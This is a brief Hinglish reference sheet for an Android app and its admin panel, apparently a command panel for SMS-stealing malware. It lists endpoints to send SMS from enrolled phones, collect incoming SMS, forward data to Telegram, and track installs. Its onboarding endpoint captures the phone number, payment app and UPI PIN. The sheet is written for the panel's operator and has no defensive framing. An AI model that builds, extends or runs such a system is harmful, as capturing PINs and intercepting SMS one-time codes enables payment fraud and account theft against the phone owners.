APK

Access

Admin: username + password. User: sirf access key (admin generate karta hai, koi self-register nahi).

Key endpoints

POST /admin/keys (generate) · POST /panel/access (login by key) · POST /admin/keys/{id}/expiry|toggle|delete

Dual SIM

Auto Sender me SIM 1 / SIM 2 chips se choose karo — jo on honge wahi slots par SMS queue hoga. Message list me SIM badge dikhta hai. Ack me sim_slot wapas aata hai, isliye badge exact hota hai.

Telegram confirm

On hone par har auto-send ka confirm forward target par set format me jaata hai.

Send

/admin/send — target, device_id, to, body, sim_slots[] . Delivery fail ho to row pending rehti hai aur device online hote hi chali jaati hai.

Send status

queued → sent → delivered. Device har stage par ack bhejta hai; stale "queued" rows 3 min baad dobara push hoti hain.

Growth

/devices/event par install / update / open. Uninstall Android se broadcast nahi hota — 7 din silence = uninstalled. Same android_id par naya install_id = reinstall.

Device socket

/ws/device/{registration_id}

SMS ingest

/devices/sms/incoming

Onboarding

/devices/onboarding — phone number, payment app aur UPI PIN capture

Relay

/admin/relay/* — MTProto login, bans, parser test, forward target.

Secrets

SESSION_SECRET (Heroku par set karna zaruri hai), ADMIN_API_KEY, MONGODB_URI aur TELE_API_HASH server-side rakho.
